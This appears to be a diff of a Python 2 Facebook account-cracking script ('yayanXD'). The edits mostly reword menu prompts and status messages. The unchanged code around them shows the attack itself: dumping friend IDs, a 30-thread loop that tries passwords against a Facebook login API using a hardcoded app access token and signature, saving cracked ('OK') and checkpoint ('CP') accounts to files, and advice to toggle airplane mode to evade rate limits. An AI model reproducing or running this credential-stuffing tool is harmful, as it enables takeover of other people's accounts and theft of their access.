@@ -142,8 +142,8 @@ def moch_yayan():
     print logo
     IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
     print '___________________________________________________________\n';time.sleep(0.03)
-    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
-    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
+    print ' [\033[0;96m◍➤\033[0m] NAMA : %s'%(nama);time.sleep(0.03)
+    print ' [\033[0;96m◍➤\033[0m] IP   : %s'%(IP)
     print '___________________________________________________________\n';time.sleep(0.03)
     print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman'%(O,N);time.sleep(0.03)
     print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman Publik'%(O,N);time.sleep(0.03)
@@ -548,7 +548,7 @@ class __crack__:
                     print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
-                        cin = raw_input('\n [◍➤] Method : ')
+                        cin = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Methode : ')
                         if cin == '':
                             print '\n %s[%s×%s] Jangan Kosong Bro'%(N,M,N);__yan__()()
                         elif cin == '1':
@@ -580,7 +580,7 @@ class __crack__:
                         elif cin == '3':
                             print '\n [%s+%s] hasil OK disimpan ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
+                            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -625,7 +625,7 @@ class __crack__:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
             if response.status_code != 200:
-                sys.stdout.write('\r %s[%s!%s] Hidupkan Mode Pesawat 1 Detik'%(N,M,N)),
+                sys.stdout.write('\r %s[%s!%s] If No Result Use Airplane Mode 1 Second'%(N,M,N)),
                 sys.stdout.flush()
                 loop +=1
                 self.__api__()
@@ -762,13 +762,13 @@ class __crack__:
                 continue
         loop += 1
     def __pler__(self):
-        yan = raw_input('\n [*] Method : ')
+        yan = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Methode : ')
         if yan == '':
             print '\n %s[%s×%s] Jangan Kosong Bos'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
             print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
+            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -787,7 +787,7 @@ class __crack__:
         elif yan in ('2', '02'):
             print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
+            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -806,7 +806,7 @@ class __crack__:
         elif yan in ('3', '03'):
             print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
+            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
